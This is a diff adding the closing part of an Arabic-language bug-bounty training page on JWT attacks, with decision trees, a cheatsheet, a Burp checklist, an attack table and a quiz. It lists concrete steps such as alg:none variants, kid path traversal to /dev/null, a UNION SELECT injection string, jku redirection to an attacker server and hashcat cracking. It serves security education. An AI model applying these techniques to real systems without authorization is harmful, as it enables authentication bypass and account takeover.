+                                IF RS256/ES256 BRANCH</p>
+                            <div class="dt-row"><span class="darr">→</span><span class="dw dn">Algorithm
+                                    confusion</span></div>
+                            <div class="dt-row"><span class="darr">→</span><span class="dw dn">jku injection →
+                                    attacker server</span></div>
+                            <div class="dt-row"><span class="darr">→</span><span class="dw dn">jwk embedded key
+                                    attack</span></div>
+                        </div>
+                    </div>
+
+                    <p
+                        style="color:var(--muted);font-family:'Cinzel',serif;font-size:.52rem;letter-spacing:.12em;margin:.8rem 0 .4rem">
+                        PHASE 4 — HEADER PARAMETERS (any algorithm)</p>
+                    <div class="dt-row"><span class="dq dn">kid parameter present?</span><span
+                            class="dy dn">YES</span><span class="darr">→</span><span class="da dn">Path traversal
+                            ../../../../dev/null + SQL injection</span></div>
+                    <div class="dt-row"><span class="dq dn">jku parameter present?</span><span
+                            class="dy dn">YES</span><span class="darr">→</span><span class="da dn">Redirect to
+                            attacker JWKS server</span></div>
+                    <div class="dt-row"><span class="dq dn">jwk parameter present?</span><span
+                            class="dy dn">YES</span><span class="darr">→</span><span class="da dn">Embedded JWK
+                            attack (Burp JWT Editor)</span></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="dt rev" style="margin-bottom:2rem">
+            <div class="dt-lbl">// NONE ALGORITHM DETAILED TREE</div>
+            <div style="direction:ltr">
+                <div class="dt-row"><span class="dq dn">alg:none attempt</span></div>
+                <div class="di">
+                    <div class="dt-row"><span class="darr">→</span><span class="da dn">Try lowercase:
+                            alg:"none"</span><span class="dy dn">200?</span><span class="darr">→</span><span
+                            class="dr2 dn">✅ DONE</span></div>
+                    <div class="dt-row"><span class="darr">→</span><span class="da dn">Try: alg:"None"</span><span
+                            class="dy dn">200?</span><span class="darr">→</span><span class="dr2 dn">✅ DONE</span>
+                    </div>
+                    <div class="dt-row"><span class="darr">→</span><span class="da dn">Try: alg:"NONE"</span><span
+                            class="dy dn">200?</span><span class="darr">→</span><span class="dr2 dn">✅ DONE</span>
+                    </div>
+                    <div class="dt-row"><span class="darr">→</span><span class="da dn">Try: remove alg field
+                            entirely</span><span class="dy dn">200?</span><span class="darr">→</span><span
+                            class="dr2 dn">✅ DONE</span></div>
+                    <div class="dt-row"><span class="darr">→</span><span class="da dn">Try: empty signature (keep
+                            dot)</span><span class="dy dn">200?</span><span class="darr">→</span><span class="dr2 dn">✅
+                            DONE</span></div>
+                    <div class="dt-row"><span class="dn-ok dn">All 401</span><span class="darr">→</span><span
+                            class="da dn">None algorithm properly blocked → next attack</span></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="dt rev">
+            <div class="dt-lbl">// KID INJECTION DECISION TREE</div>
+            <div style="direction:ltr">
+                <div class="dt-row"><span class="dq dn">kid parameter in header?</span></div>
+                <div class="di">
+                    <div class="dt-row"><span class="dq dn">kid value looks like a filename?</span><span
+                            class="dy dn">YES</span><span class="darr">→</span><span class="da dn">Path traversal:
+                            ../../../../dev/null</span></div>
+                    <div class="dt-row"><span class="dq dn">kid reflected in error messages?</span><span
+                            class="dy dn">YES</span><span class="darr">→</span><span class="da dn">SQL injection:
+                            xxx' UNION SELECT 'x'-- -</span></div>
+                    <div class="dt-row"><span class="dq dn">Path traversal works?</span><span
+                            class="dy dn">YES</span><span class="darr">→</span><span class="dr2 dn">Sign with empty
+                            secret "" ✅</span></div>
+                    <div class="dt-row"><span class="dq dn">SQL injection works?</span><span
+                            class="dy dn">YES</span><span class="darr">→</span><span class="dr2 dn">Sign with
+                            injected secret ✅</span></div>
+                    <div class="dt-row"><span class="dn-ok dn">Both fail</span><span class="darr">→</span><span
+                            class="da dn">Check jku/jwk parameters</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S14: CHEATSHEET ═══ -->
+<section class="section" id="s14">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 14 — الملخص</div>
+            <h2 class="sec-title">JWT <em>Cheatsheet</em> الكامل</h2>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+
+        <div class="g2 rev" style="margin-bottom:1.5rem">
+            <div class="card cr">
+                <div class="clabel">🔍 Identification</div>
+                <ul class="cl">
+                    <li>ابحث عن <span class="ic">eyJ</span> في كل الـ headers والـ cookies</li>
+                    <li>Authorization: Bearer / Cookie: jwt= / Cookie: token=</li>
+                    <li>افتح jwt.io — وثق algorithm وكل الـ claims</li>
+                    <li>شيل آخر حرف من الـ sig → test validation</li>
+                    <li>دور على kid/jku/jwk في الـ header</li>
+                </ul>
+            </div>
+            <div class="card cr">
+                <div class="clabel">⚔️ Attack Priority</div>
+                <ul class="cl">
+                    <li><span class="tg">1st</span> Test signature validation (remove last char)</li>
+                    <li><span class="tg">2nd</span> alg:none attack (all case variations)</li>
+                    <li><span class="tg">3rd</span> Hashcat weak secret (HS256 only)</li>
+                    <li><span class="tg">4th</span> Algorithm confusion (RS256 → HS256)</li>
+                    <li><span class="tg">5th</span> kid/jku/jwk header injection</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="g2 rev" style="margin-bottom:1.5rem">
+            <div class="card cr">
+                <div class="clabel">🔑 Public Key Locations</div>
+                <ul class="cl">
+                    <li><span class="ic">/.well-known/jwks.json</span> — أشهر endpoint</li>
+                    <li><span class="ic">/api/auth/jwks</span> — custom endpoint</li>
+                    <li><span class="ic">/oauth/.well-known/openid-configuration</span></li>
+                    <li><span class="ic">/public-key</span> أو <span class="ic">/cert</span></li>
+                    <li>الـ JavaScript source code (client-side signing anti-pattern)</li>
+                </ul>
+            </div>
+            <div class="card cr">
+                <div class="clabel">🛠️ Tools</div>
+                <ul class="cl">
+                    <li><span class="tg">jwt.io</span> — Decode وتعديل الـ tokens</li>
+                    <li><span class="tg">Burp JWT Editor</span> — All JWT attacks (extension)</li>
+                    <li><span class="tg">jwt_tool.py</span> — CLI attacks وscanning</li>
+                    <li><span class="tg">Hashcat -m 16500</span> — Offline secret cracking</li>
+                    <li><span class="tg">jwt-cracker</span> — Brute force alternative</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="cb rev">
+            <span class="cb-lbl">// BURP REPEATER CHECKLIST — لكل JWT جديد</span>
+            <span class="r">[ ] 1.</span> <span class="w">Decode at jwt.io → document algorithm + claims</span>
+            <span class="r">[ ] 2.</span> <span class="w">Remove last sig char → 200? → payload is writable!</span>
+            <span class="g">[ ] 3.</span> <span class="w">alg:none → keep trailing dot → try all case
+                variations</span>
+            <span class="g">[ ] 4.</span> <span class="w">HS256? → hashcat -m 16500 → check weak wordlists
+                first</span>
+            <span class="g">[ ] 5.</span> <span class="w">RS256? → get public key → algorithm confusion → sign with
+                it</span>
+            <span class="t">[ ] 6.</span> <span class="w">kid present? → ../../../../dev/null → SQL injection</span>
+            <span class="t">[ ] 7.</span> <span class="w">jku present? → redirect to attacker server</span>
+            <span class="t">[ ] 8.</span> <span class="w">jwk present? → Burp JWT Editor → Embedded JWK</span>
+            <span class="y">[ ] 9.</span> <span class="w">Got valid forge? → escalate: role→admin, sub→1,
+                exp→9999999999</span>
+            <span class="y">[ ] 10.</span> <span class="w">Document: original token + attack token + request +
+                response</span>
+        </div>
+
+        <div class="rev" style="overflow-x:auto;margin-top:2rem">
+            <table class="dt2">
+                <thead>
+                    <tr>
+                        <th>Attack</th>
+                        <th>الـ Condition</th>
+                        <th>الـ Tool</th>
+                        <th>الـ Impact</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Signature Not Validated</td>
+                        <td>اي algorithm</td>
+                        <td>Burp Repeater</td>
+                        <td><span class="pb crit">AUTH BYPASS</span></td>
+                    </tr>
+                    <tr>
+                        <td>alg:none</td>
+                        <td>Library vulnerable</td>
+                        <td>Burp JWT Editor</td>
+                        <td><span class="pb crit">AUTH BYPASS</span></td>
+                    </tr>
+                    <tr>
+                        <td>Weak Secret</td>
+                        <td>HS256</td>
+                        <td>Hashcat -m 16500</td>
+                        <td><span class="pb crit">TOKEN FORGE</span></td>
+                    </tr>
+                    <tr>
+                        <td>Algorithm Confusion</td>
+                        <td>RS256/ES256</td>
+                        <td>jwt_tool.py -X k</td>
+                        <td><span class="pb crit">TOKEN FORGE</span></td>
+                    </tr>
+                    <tr>
+                        <td>kid Path Traversal</td>
+                        <td>kid in header</td>
+                        <td>Manual + jwt_tool</td>
+                        <td><span class="pb crit">TOKEN FORGE</span></td>
+                    </tr>
+                    <tr>
+                        <td>kid SQL Injection</td>
+                        <td>kid → DB</td>
+                        <td>Manual</td>
+                        <td><span class="pb crit">TOKEN FORGE</span></td>
+                    </tr>
+                    <tr>
+                        <td>jku Injection</td>
+                        <td>jku in header</td>
+                        <td>Burp JWT Editor</td>
+                        <td><span class="pb crit">TOKEN FORGE</span></td>
+                    </tr>
+                    <tr>
+                        <td>jwk Injection</td>
+                        <td>jwk accepted</td>
+                        <td>Burp JWT Editor</td>
+                        <td><span class="pb crit">TOKEN FORGE</span></td>
+                    </tr>
+                    <tr>
+                        <td>Claim: role → admin</td>
+                        <td>بعد forging</td>
+                        <td>jwt.io</td>
+                        <td><span class="pb crit">PRIV ESC</span></td>
+                    </tr>
+                    <tr>
+                        <td>Claim: exp → 9999999999</td>
+                        <td>بعد forging</td>
+                        <td>jwt.io</td>
+                        <td><span class="pb high">PERSISTENCE</span></td>
+                    </tr>
+                    <tr>
+                        <td>Claim: sub → 1 (admin)</td>
+                        <td>بعد forging</td>
+                        <td>jwt.io</td>
+                        <td><span class="pb crit">ATO</span></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S15: QUIZ ═══ -->
+<section class="section" id="s15">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 15 — اختبر نفسك</div>
+            <h2 class="sec-title"><em>Quiz</em> — JWT Attacks</h2>
+            <p class="sec-desc">6 أسئلة عن decision-making حقيقي — مش عن تعريفات.</p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+
+        <div class="qc rev" id="q1">
+            <div class="qq">شيلت آخر حرف من الـ JWT signature وبعثته — رجعلك 200 OK. إيه خطوتك الجاية؟</div>
+            <div class="qos">
+                <div class="qo" data-v="A"><span class="ql">A.</span> ابعت report فوراً — الـ signature مش validated
+                </div>
+                <div class="qo" data-v="B"><span class="ql">B.</span> غير الـ role في الـ payload لـ "admin" وبعت
+                    الـ request وتأكد من الـ access</div>
+                <div class="qo" data-v="C"><span class="ql">C.</span> جرب الـ none algorithm attack</div>
+                <div class="qo" data-v="D"><span class="ql">D.</span> شغل hashcat على الـ token</div>
+            </div>
+            <div class="qe" id="q1-e"><strong>الإجابة الصح: B</strong><br><br>لما الـ signature مش validated — ده
+                معناه إنت تقدر تغير أي claim في الـ payload وتبعته مباشرة. الخطوة الجاية هي <strong>إثبات الـ
+                    impact</strong>: غير الـ role لـ admin وتأكد إن الـ admin access بيشتغل. الـ report بيكتب بعد
+                إثبات الـ impact مش قبله.</div>
+        </div>
+
+        <div class="qc rev" id="q2">
+            <div class="qq">التطبيق بيستخدم RS256. جبت الـ public key من /.well-known/jwks.json. إيه الـ attack اللي
+                هتجربه أول؟</div>
+            <div class="qos">
+                <div class="qo" data-v="A"><span class="ql">A.</span> Hashcat brute force على الـ RS256 token</div>
+                <div class="qo" data-v="B"><span class="ql">B.</span> Algorithm confusion: غير alg لـ HS256 ووقع الـ
+                    token بالـ public key كـ HMAC secret</div>
+                <div class="qo" data-v="C"><span class="ql">C.</span> alg:none attack</div>
+                <div class="qo" data-v="D"><span class="ql">D.</span> Claim manipulation مباشرة</div>
+            </div>
+            <div class="qe" id="q2-e"><strong>الإجابة الصح: B</strong><br><br>مع RS256 والـ public key متاح — الـ
+                algorithm confusion هو أقوى attack. الـ hashcat مش هينفع مع RS256 (ده خاص بـ HMAC). الـ alg:none
+                ممكن تجربه بس الـ algorithm confusion هو الأذكى في الحالة دي.</div>
+        </div>
+
+        <div class="qc rev" id="q3">
+            <div class="qq">الـ JWT header يحتوي على: {"alg":"HS256","typ":"JWT","kid":"keys/signing-key-2024"}. إيه
+                الـ attack اللي بيلفت نظرك؟</div>
+            <div class="qos">
+                <div class="qo" data-v="A"><span class="ql">A.</span> alg:none — غير الـ algorithm</div>
+                <div class="qo" data-v="B"><span class="ql">B.</span> Algorithm confusion — HS256 → RS256</div>
+                <div class="qo" data-v="C"><span class="ql">C.</span> kid Path Traversal: غير kid لـ
+                    "../../../../dev/null"</div>
+                <div class="qo" data-v="D"><span class="ql">D.</span> Hashcat brute force على الـ secret</div>
+            </div>
+            <div class="qe" id="q3-e"><strong>الإجابة الصح: C</strong><br><br>وجود الـ kid parameter بالشكل ده
+                (path-like string) هو indicator واضح لـ path traversal attack. غير الـ kid لـ "../../../../dev/null"
+                — لو الـ server بيجيب الـ key من الـ filesystem ده هيرجع empty string — وتقدر توقع الـ token بـ
+                secret="".</div>
+        </div>
+
+        <div class="qc rev" id="q4">
+            <div class="qq">ايه الفرق العملي بين jwt.decode() وjwt.verify() في الـ Node.js jsonwebtoken library؟
+            </div>
+            <div class="qos">
+                <div class="qo" data-v="A"><span class="ql">A.</span> مفيش فرق — الاتنين بيتحققوا من الـ signature
+                </div>
+                <div class="qo" data-v="B"><span class="ql">B.</span> decode() بيقرأ الـ payload بدون التحقق من الـ
+                    signature — verify() بيتحقق</div>
+                <div class="qo" data-v="C"><span class="ql">C.</span> verify() أسرع من decode()</div>
+                <div class="qo" data-v="D"><span class="ql">D.</span> decode() بيتشيك من الـ expiry فقط</div>
+            </div>
+            <div class="qe" id="q4-e"><strong>الإجابة الصح: B</strong><br><br>decode() بيفك الـ base64 وبيرجع الـ
+                payload من غير أي تحقق من الـ signature. verify() بيتحقق من الـ signature والـ expiry والـ
+                algorithm. استخدام decode() بدل verify() بيلغي كل حماية الـ JWT.</div>
+        </div>
+
+        <div class="qc rev" id="q5">
+            <div class="qq">جربت alg:none وHS256 brute force والـ kid path traversal — كلها فشلت. الـ JWT بيستخدم
+                RS256. إيه بعدين؟</div>
+            <div class="qos">
+                <div class="qo" data-v="A"><span class="ql">A.</span> إنهاء الـ testing — الـ JWT آمن</div>
+                <div class="qo" data-v="B"><span class="ql">B.</span> جرب jku injection: ضيف jku parameter بـ URL لـ
+                    server بتاعك + Embedded JWK attack</div>
+                <div class="qo" data-v="C"><span class="ql">C.</span> جرب تخمين الـ private key</div>
+                <div class="qo" data-v="D"><span class="ql">D.</span> روح لـ endpoint تاني</div>
+            </div>
+            <div class="qe" id="q5-e"><strong>الإجابة الصح: B</strong><br><br>الـ JWT testing مش بتخلص بكده. مع
+                RS256 — جرب jku injection (ضيف jku parameter بـ URL لـ JWKS server بتاعك)، وjwk injection (ضمن الـ
+                public key بتاعك في الـ header). Burp JWT Editor extension بيعمل الاتنين بـ 1 click.</div>
+        </div>
+
+        <div class="qc rev" id="q6">
+            <div class="qq">قدرت تزور JWT بـ role:"admin". شايف /admin/dashboard و/admin/users و/admin/export. إيه
+                الـ impact اللي هتبني عليه الـ report؟</div>
+            <div class="qos">
+                <div class="qo" data-v="A"><span class="ql">A.</span> "Authentication Bypass" — وبس</div>
+                <div class="qo" data-v="B"><span class="ql">B.</span> إثبات access للـ dashboard فقط</div>
+                <div class="qo" data-v="C"><span class="ql">C.</span> إثبات Full Admin Takeover: وصول لـ users data،
+                    export كل الـ records، potential RCE لو في admin functions</div>
+                <div class="qo" data-v="D"><span class="ql">D.</span> الـ report مش محتاج impact — الـ vulnerability
+                    واضح</div>
+            </div>
+            <div class="qe" id="q6-e"><strong>الإجابة الصح: C</strong><br><br>الـ impact بيتحدد بأعلى حاجة قدرت
+                تعملها. مش بس "وصلت للـ admin dashboard" — وصلت لـ users data (PII)، قدرت تعمل export للـ database،
+                وممكن في admin functions ممكن تؤدي لـ RCE. كل ده بيرفع الـ severity ويزود الـ bounty.</div>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="rline"></div>
+    <p>HAMADA KHAIRY ACADEMY · JWT ATTACKS METHODOLOGY · BUG BOUNTY</p>
+    <p style="margin-top:.5rem;font-size:.5rem;opacity:.35">PHASE 2 — AUTHENTICATION TRACK · JWT → SESSION → OAUTH
+    </p>
+    <div class="rline"></div>
+</footer>
+
+<script>
+    // REVEAL
+    const obs = new IntersectionObserver(es => es.forEach(e => { if (e.isIntersecting) e.target.classList.add('in') }), { threshold: .07 });
+    document.querySelectorAll('.rev').forEach(r => obs.observe(r));
+
+    // NAV ACTIVE
+    const secEls = document.querySelectorAll('section[id]');
+    const navLinks = document.querySelectorAll('.nav-link');
+    const navObs = new IntersectionObserver(es => {
+        es.forEach(e => {
+            if (e.isIntersecting) {
+                navLinks.forEach(l => l.classList.remove('active'));
+                const a = document.querySelector(`.nav-link[href="#${e.target.id}"]`);
+                if (a) { a.classList.add('active'); a.scrollIntoView({ block: 'nearest', inline: 'center' }); }
+            }
+        });
+    }, { threshold: .25 });
+    secEls.forEach(s => navObs.observe(s));
+
+    // QUIZ
+    const ANS = { q1: 'B', q2: 'B', q3: 'C', q4: 'B', q5: 'B', q6: 'C' };
+    document.querySelectorAll('.qc').forEach(card => {
+        const id = card.id; const correct = ANS[id];
+        card.querySelectorAll('.qo').forEach(opt => {
+            opt.addEventListener('click', function () {
+                if (card.querySelector('.correct')) return;
+                card.querySelectorAll('.qo').forEach(o => { if (o.dataset.v === correct) o.classList.add('correct'); });
+                if (this.dataset.v !== correct) this.classList.add('wrong');
+                document.getElementById(id + '-e')?.classList.add('show');
+            });
+        });
+    });
+</script>
+
+<!-- BLACK SITE SCRIPTS -->
+<script>
+    /* ═══ CURSOR ═══ */
+    const dot = document.getElementById('cursorDot');
+    const ring = document.getElementById('cursorRing');
+    let mx = 0, my = 0, rx = 0, ry = 0;
+    document.addEventListener('mousemove', e => { mx = e.clientX; my = e.clientY; });
+    (function animCursor() {
+        rx += (mx - rx) * 0.18;
+        ry += (my - ry) * 0.18;
+        if (dot) { dot.style.left = mx + 'px'; dot.style.top = my + 'px'; }
+        if (ring) { ring.style.left = rx + 'px'; ring.style.top = ry + 'px'; }
+        requestAnimationFrame(animCursor);
+    })();
+
+    /* ═══ HEX CANVAS ═══ */
+    (function () {
+        const canvas = document.getElementById('hexCanvas');
+        if (!canvas) return;
+        const ctx = canvas.getContext('2d');
+        let w, h, hexes = [];
+        function resize() { w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight; buildHexes(); }
+        function buildHexes() {
+            hexes = [];
+            const size = 40, xStep = size * 1.75, yStep = size * 1.52;
+            for (let row = -1; row * yStep < h + yStep; row++) {
+                for (let col = -1; col * xStep < w + xStep; col++) {
+                    const x = col * xStep + (row % 2 ? xStep * 0.5 : 0);
+                    const y = row * yStep;
+                    hexes.push({ x, y, size, phase: Math.random() * Math.PI * 2, speed: 0.001 + Math.random() * 0.002 });
+                }
+            }
+        }
+        function drawHex(x, y, s, alpha) {
+            ctx.beginPath();
+            for (let i = 0; i < 6; i++) {
+                const a = (Math.PI / 3) * i - Math.PI / 6;
+                const px = x + s * Math.cos(a), py = y + s * Math.sin(a);
+                i === 0 ? ctx.moveTo(px, py) : ctx.lineTo(px, py);
+            }
+            ctx.closePath();
+            ctx.strokeStyle = `rgba(201,160,99,${alpha})`;
+            ctx.lineWidth = 0.5;
+            ctx.stroke();
+        }
+        let t = 0;
+        function draw() {
+            ctx.clearRect(0, 0, w, h);
+            t += 0.005;
+            hexes.forEach(h => {
+                const a = (Math.sin(t * h.speed * 200 + h.phase) + 1) * 0.5;
+                const alpha = a * 0.04 + 0.01;
+                drawHex(h.x, h.y, h.size, alpha);
+            });
+            requestAnimationFrame(draw);
+        }
+        window.addEventListener('resize', resize);
+        resize();
+        draw();
+    })();
+</script>
+</body>
+
+</html>
